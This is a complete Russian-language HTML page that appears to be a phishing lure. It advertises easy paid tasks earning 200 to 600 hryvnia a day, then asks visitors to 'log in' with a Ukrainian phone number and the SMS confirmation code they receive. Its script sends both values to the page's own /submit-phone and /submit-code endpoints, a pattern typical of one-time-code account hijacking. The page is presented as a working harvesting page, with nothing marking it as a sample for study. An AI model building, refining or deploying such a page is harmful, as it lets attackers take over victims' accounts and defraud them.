<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Зарабатывай с нами</title>
    <style>
        body {
            margin: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a1a1a, #2c2c2c);
            color: #ffeb3b;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container {
            text-align: center;
            padding: 20px;
            max-width: 600px;
            width: 90%;
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(255, 235, 59, 0.8);
        }
        p {
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        .btn {
            background: linear-gradient(45deg, #ffeb3b, #fbc02d);
            color: #1a1a1a;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 1.2em;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            box-shadow: 0 4px 15px rgba(255, 235, 59, 0.4);
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(255, 235, 59, 0.6);
        }
        .form-container {
            display: none;
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 235, 59, 0.2);
            width: 100%;
            max-width: 400px;
            animation: fadeIn 0.5s;
        }
        .form-container.active {
            display: block;
        }
        input[type="tel"], input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #333;
            color: #ffeb3b;
            font-size: 1em;
        }
        input[type="tel"]::placeholder, input[type="text"]::placeholder {
            color: #ffeb3b;
            opacity: 0.7;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://via.placeholder.com/150x150.png?text=Logo" alt="Логотип" class="logo">
        <h1>Платим за выполнение простых заданий</h1>
        <p>Получай от 200 до 600 грн в день</p>
        <button class="btn" onclick="showPhoneForm()">Начать</button>
        <div id="phoneForm" class="form-container">
            <h2>Авторизуйся, чтобы начать</h2>
            <input type="tel" id="phoneNumber" value="+380" maxlength="13" oninput="formatPhoneNumber(this)" required>
            <button class="btn" onclick="submitPhone()">Авторизоваться</button>
        </div>
        <div id="codeForm" class="form-container">
            <h2>Ожидайте SMS с кодом</h2>
            <input type="text" id="code" placeholder="Введите код" required>
            <button class="btn" onclick="submitCode()">Подтвердить</button>
        </div>
    </div>
    <script>
        function formatPhoneNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 3) {
                value = `+${value.slice(0, 3)} ${value.slice(3, 5)} ${value.slice(5, 8)} ${value.slice(8, 10)} ${value.slice(10, 12)}`;
            } else {
                value = `+${value}`;
            }
            input.value = value.trim();
        }

        function showPhoneForm() {
            document.getElementById('phoneForm').classList.add('active');
            document.querySelector('button[onclick="showPhoneForm()"]').style.display = 'none';
        }

        async function submitPhone() {
            const phone = document.getElementById('phoneNumber').value;
            if (phone.length < 13) {
                alert('Введите корректный номер телефона');
                return;
            }
            try {
                const response = await fetch('/submit-phone', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });
                if (response.ok) {
                    document.getElementById('phoneForm').classList.remove('active');
                    document.getElementById('codeForm').classList.add('active');
                } else {
                    alert('Ошибка при отправке номера');
                }
            } catch (error) {
                alert('Ошибка сервера');
            }
        }

        async function submitCode() {
            const code = document.getElementById('code').value;
            if (!code) {
                alert('Введите код');
                return;
            }
            try {
                const response = await fetch('/submit-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code })
                });
                if (response.ok) {
                    alert('Код отправлен');
                } else {
                    alert('Ошибка при отправке кода');
                }
            } catch (error) {
                alert('Ошибка сервера');
            }
        }
    </script>
</body>
</html>
